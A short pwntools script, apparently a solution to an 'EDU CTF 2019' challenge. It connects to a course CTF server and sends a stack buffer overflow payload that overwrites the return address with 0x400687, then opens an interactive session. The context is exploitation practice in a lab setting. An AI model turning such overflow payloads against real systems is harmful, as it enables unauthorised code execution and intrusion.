from pwn import *

conn = remote("edu-ctf.csie.org", 10170)
bof = 'a'*0x30 + p64(0x400687)
conn.sendlineafter('Welcome to EDU CTF 2019.', bof)
conn.interactive()
